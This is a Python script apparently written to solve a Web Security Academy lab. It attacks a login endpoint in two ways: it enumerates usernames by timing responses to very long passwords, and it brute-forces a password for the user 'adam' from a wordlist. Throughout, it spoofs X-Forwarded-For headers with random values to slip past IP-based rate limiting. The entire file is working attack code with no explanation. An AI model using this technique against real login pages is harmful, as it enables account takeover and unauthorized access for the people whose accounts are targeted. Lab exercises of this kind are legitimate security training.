import requests
import random
import time

url = 'https://ac9b1f071f12e7fdc0ef312c001700a1.web-security-academy.net/login'

def generateIP():
    return str(random.randint(0, 9999999)) + '.' + str(random.randint(0, 9999999)) + '.' + str(random.randint(0, 9999999)) + '.' + str(random.randint(0, 9999999))

def getUsername():
    usernames = open('../../wordlist/username.txt')

    for username in usernames:
        if username.replace('\n', '') == 'wiener':
            continue

        start = time.time()

        requests.post(url, headers={
            'X-Forwarded-For': generateIP()
        }, data={
            'username': username.replace('\n', ''),
            'password': 'whatever' * 100
        })

        end = time.time()

        if end - start > 5:
            print(username)
            break

def getPassword():
    passwords = open('../../wordlist/password.txt')

    for password in passwords:
        response = requests.post(url, headers={
            'X-Forwarded-for': generateIP()
        }, data={
            'username': 'adam',
            'password': password.replace('\n', '')
        })

        if 'Invalid username or password.' not in response.text:
            print(password)
            break

getPassword()